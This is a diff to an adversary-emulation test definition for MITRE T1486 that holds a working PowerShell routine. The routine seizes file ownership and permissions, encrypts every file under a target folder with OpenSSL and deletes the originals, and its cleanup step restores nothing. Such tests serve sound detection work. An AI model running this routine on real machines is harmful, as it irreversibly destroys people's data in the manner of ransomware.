@@ -1,10 +1,10 @@
 attack_technique: T1486
 display_name: Data Encrypted for Impact (Destructive Version)
 atomic_tests:
-- name: Encrypt and delete files recursively on C:\
+- name: Encrypt and delete files recursively in a test folder
   auto_generated_guid: custom-guid-1234567890abcdef
   description: |
-    This test encrypts all files on the C:\ drive recursively using a strong password and then deletes the original files.
+    This test encrypts all files in a test folder using a strong password and then deletes the original files.
     WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
   supported_platforms:
   - windows
@@ -33,27 +33,38 @@ atomic_tests:
     command: |
       $password = "#{encryption_password}"
       $targetDir = "#{target_directory}"
-      Write-Host "Encrypting files in $targetDir recursively..."
       
-      # Find all files in the target directory
+      # Vérifier si le répertoire cible existe
+      if (-Not (Test-Path $targetDir)) {
+          Write-Host "Le répertoire cible $targetDir n'existe pas."
+          exit 1
+      }
+
+      Write-Host "Encrypting files in $targetDir recursively..."
+
+      # Prendre possession et modifier les permissions des fichiers
       Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
           $file = $_.FullName
+
+          # Prendre possession du fichier
+          takeown /F $file /A
+          icacls $file /grant Administrators:F /T /C
+
+          # Chiffrer le fichier avec OpenSSL
           $encryptedFile = "$file.enc"
-          
-          # Encrypt the file using openssl
           openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
           
           if ($LASTEXITCODE -eq 0) {
               Write-Host "Encrypted: $file -> $encryptedFile"
               
-              # Delete the original file after successful encryption
-              Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
+              # Supprimer le fichier original après chiffrement réussi
+              Remove-Item -Path $file -Force
               Write-Host "Deleted: $file"
           } else {
               Write-Host "Failed to encrypt: $file"
           }
       }
-      
+
       Write-Host "Encryption and deletion process completed."
     cleanup_command: |
       Write-Host "No cleanup performed for destructive actions."
